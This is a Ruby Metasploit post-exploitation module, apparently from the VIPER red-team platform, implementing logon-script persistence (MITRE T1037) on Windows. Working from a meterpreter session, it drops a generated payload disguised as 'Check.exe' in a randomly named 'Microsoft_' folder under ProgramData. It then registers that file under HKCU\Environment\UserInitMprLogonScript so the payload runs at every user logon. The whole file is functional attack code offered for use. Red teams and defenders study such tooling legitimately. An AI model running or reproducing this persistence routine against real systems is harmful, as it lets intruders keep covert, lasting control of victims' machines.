##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE
  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Logon Scripts (T1037) Windows - VIPER',
                      'Description'   => %q{
                          Persistence, Lateral Movement:
                          Windows allows logon scripts to be run whenever a specific user or group of users log into a system. The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.},
                      'License'       => MSF_LICENSE,
                      'Author'        => ['Praetorian'],
                      'References'    => [['URL', 'https://attack.mitre.org/wiki/Technique/T1037']],
                      'Platform'      => ['win'],
                      'Targets'       => [['Windows', {}]],
                      'SessionTypes'  => ['meterpreter'],
                      'DefaultTarget' => 0,
          ))
    register_options(
            [
            ])
  end

  def exploit

    unless session.type == "meterpreter"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end

    vprint_status("Running module against #{sysinfo['Computer']}")

    @storedir = create_store_rand_dir()
    if @storedir == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end

    exe      = generate_payload_exe
    exe_path = @storedir + "\\" + "Check.exe"
    write_file_to_target(exe_path, exe)

    unless session.fs.file.exist? exe_path
      pub_json_result(false,
                      'write loader to storedir failed,maybe permission or AV',
                      nil,
                      self.uuid)
      return
    end

    reg_base_key = "HKCU\\Environment"
    reg_base_val = "UserInitMprLogonScript"
    unless registry_key_exist? reg_base_key
      unless registry_createkey(reg_base_key)
        pub_json_result(false,
                        'crete registry failed',
                        nil,
                        self.uuid)
      end
    end
    # add the logon script
    if registry_setvaldata(reg_base_key, reg_base_val, exe_path, "REG_SZ")
      vprint_good("Success! To test persistence, log out and then log in.")
      pub_json_result(true,
                      nil,
                      exe_path,
                      self.uuid)
      return
    else
      pub_json_result(false,
                      'write registry failed',
                      nil,
                      self.uuid)
    end

  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(6)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + "Microsoft_#{dirname}"
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end

  def write_file_to_target(filepath, filedata)
    fd = session.fs.file.new(filepath, "wb")
    fd.write(filedata)
    fd.close
  end
end
